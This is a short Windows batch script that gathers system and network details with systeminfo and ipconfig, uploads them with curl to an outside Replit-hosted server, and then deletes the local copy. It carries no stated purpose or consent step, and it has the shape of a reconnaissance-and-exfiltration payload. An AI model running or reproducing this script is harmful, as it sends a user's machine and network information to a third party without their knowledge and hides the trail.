@echo off
:: Collect system information
systeminfo > sysinfo.txt
ipconfig >> sysinfo.txt

:: Send the data to the Replit server
curl -X POST -H "Content-Type: text/plain" --data-binary "@sysinfo.txt" https://cfb53da8-4871-4cd0-af96-095c708ad0f5-00-1129qpina38jq.picard.replit.dev/

:: Clean up
del sysinfo.txt
